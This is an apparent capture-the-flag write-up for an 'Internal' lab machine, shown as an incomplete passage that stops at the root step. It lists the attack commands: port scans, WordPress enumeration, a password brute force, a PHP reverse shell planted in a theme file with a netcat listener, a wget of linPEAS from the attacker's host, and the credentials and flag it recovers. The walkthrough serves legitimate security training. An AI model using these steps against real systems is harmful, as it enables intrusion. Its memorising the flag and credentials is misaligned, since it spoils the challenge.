# Internal

> Penetration Testing Challenge

<br>

### Process:

1. port scan:
	- scan all ports: `sudo nmap -T4 -p- 10.10.216.36`
	- scan found ports: `sudo nmap -T4 -A -p 22,80 10.10.216.36`
	- edit attacker `/etc/hosts` file to add: `10.10.216.36 internal.thm`
2. enumerate port 22:
	- OpenSSH 7.6p1 Ubuntu found
3. enumerate port 80:
	- visit website at http://10.10.216.36 = default Apache2 web page
	- run gobuster: `gobuster dir -u http://10.10.216.36 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	- found wordpress site running
	- run wordpress scanner and enumerate everything: `wpscan --url http://10.10.216.36/blog -e`
		- found "admin" user
	- try to brute force admin users password: `wpscan --url http://10.10.216.36/blog -U admin -P /usr/share/wordlists/rockyou.txt`
		- found "my2boys" password for admin
4. exploit WordPress panel:
	- login to WordPress admin panel with "admin:my2boys"
	- go to “Appearance > Theme Editor > 404.php” and replace the PHP code with a [PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
	- setup netcat listener: `nc -lvnp 1234`
	- update the file and call the template: `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`
5. privilege esclation:
	- download linPEAS onto system: `cd /var/tmp && wget http://10.11.31.198:8080/linpeas.sh`
	- run linPEAS: `bash linpeas.sh`
	- found phpmyadmin login = "wordpress:wordpress123"
	- look around filesystem:
		- found interesting file in "/opt" directory call "wp-save.txt"
		- contains login credentials "aubreanna:bubb13guM!@#123"
	- login as aubreanna:
		- find user flag: `cat /home/aubreanna/user.txt`
		- user flag = **THM{int3rna1_fl4g_1}**
6. esclate to root:
	-  found jenkins service running on internal host at 172.17.0.2:8080
	-  ... 

